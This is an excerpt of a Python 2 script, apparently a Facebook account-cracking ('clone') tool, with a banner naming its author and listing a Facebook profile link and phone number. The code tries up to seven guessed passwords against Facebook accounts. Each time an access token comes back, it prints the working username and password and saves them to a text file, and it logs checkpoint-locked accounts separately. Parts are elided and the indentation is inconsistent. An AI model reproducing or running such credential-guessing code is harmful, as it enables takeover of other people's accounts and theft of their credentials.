...
\033[1;97m ##     ##    ##           ##### ## \033[1;0m
\033[1;97m--------------------------------------------------
\033[1;97m Code By     : Zahidullah Rohan

\033[1;97m Friends     : Wahid ,Amen ,Hafiz ,Bilal,

\033[1;97m Facebook ID : https://www.facebook.com/profile.php?id=100077963673726

\033[1;97m Whats App  : 0764972001
\033[1;97m--------------------------------------------------
"""
#call menu
def Rohan():
...
#clone Password
        ...
        try:
            ...
            if 'access_token' in q:
                print ' \x1b[1;92m(Rohan_OK) ' + k + c + user + ' | ' + pass1
                okb = open('Zahidullah.txt', 'a')
                okb.write(k + c + user + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print ' \x1b[1;91m(Zahid_CP) ' + k + c + user + ' | ' + pass1
                cps = open('Zahidullah.txt', 'a')
                ...
                q = json.load(data)
                if 'access_token' in q:
                    print ' \x1b[1;92m(Rohan_OK)' + k + c + user + ' | ' + pass2
                    okb = open('Zahidullah.txt', 'a')
                    okb.write(k + c + user + pass2 + '\n')
                    okb.close()
                    oks.append(c + user + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print ' \x1b[1;91m(Zahid_CP) ' + k + c + user + ' | ' + pass2
                    okb = open('zahidullah.txt', 'a')
                    ...
                    q = json.load(data)
                    if 'access_token' in q:
                        print ' \x1b[1;92m(Rohan_OK) ' + k + c + user + ' | ' + pass3
                        okb = open('Zahidullah.txt', 'a')
                        okb.write(k + c + user + pass3 + '\n')
                        okb.close()
                        oks.append(c + user + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print ' \x1b[1;91m(Zahid_CP) ' + k + c + user + ' | ' + pass3
                        cps = open('Zahidullah.txt', 'a')
                        ...
                        q = json.load(data)
                        if 'access_token' in q:
                            print ' \x1b[1;92m(Rohan_OK) ' + k + c + user + ' | ' + pass4
                            okb = open('Zahidullah.txt', 'a')
                            okb.write(k + c + user + pass4 + '\n')
                            okb.close()
                            oks.append(c + user + pass4)
                        elif 'www.facebook.com' in q['error_msg']:
                            print ' \x1b[1;91m(Zahid_CP) ' + k + c + user + ' | ' + pass4
                            cps = open('Zahidullah.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Rohan_OK) ' + k + c + user + ' | ' + pass5
                                okb = open('Zahidullah.txt', 'a')
                                okb.write(k + c + user + pass5 + '\n')
                                okb.close()
                                oks.append(c + user + pass5)
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Zahid_CP) ' + k + c + user + ' | ' + pass5
                                cps = open('Zahidullah.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Rohan_OK) ' + k + c + user + ' | ' + pass6
                                okb = open('Zahidullah.txt', 'a')
                                okb.write(k + c + user + pass6 + '\n')
                                okb.close()
                                oks.append(c + user + pass6 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Zahid_CP) ' + k + c + user + ' | ' + pass6
                                cps = open('Zahidullah.txt', 'a')
                            ...
                            q = json.load(data)
                            if 'access_token' in q:
                                print ' \x1b[1;92m(Rohan_OK) ' + k + c + user + ' | ' + pass7
                                okb = open('Zahidullah.txt', 'a')
                                okb.write(k + c + user + pass7 + '\n')
                                okb.close()
                                oks.append(c + user + pass7 )
                            elif 'www.facebook.com' in q['error_msg']:
                                print ' \x1b[1;91m(Zahid_CP) ' + k + c + user + ' | ' + pass7
                                cps = open('Zahidullah.txt', 'a')
